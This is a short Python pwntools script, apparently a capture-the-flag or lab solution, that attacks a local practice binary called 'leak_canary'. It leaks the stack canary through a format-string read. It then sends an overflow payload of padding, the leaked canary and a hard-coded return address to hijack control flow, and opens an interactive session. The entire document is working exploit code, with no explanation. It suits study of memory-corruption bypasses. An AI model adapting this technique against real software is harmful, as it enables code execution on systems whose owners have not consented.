from pwn import *

p = process("./leak_canary")
gdb.attach(p,"b printf")

target = 0x080485CC

p1 = "%{offset}$p\n".format(offset = 0x48 - 1)
p.send(p1)
leak_info = p.recvuntil("\n",drop = True)
canary = int(leak_info,16)
log.success("canary:" + hex(canary))

p2 = "\x00" * 0x100 + p32(canary)
p2 += p32(0) * 3
p2 += p32(target)
p.send(p2)
p.interactive()
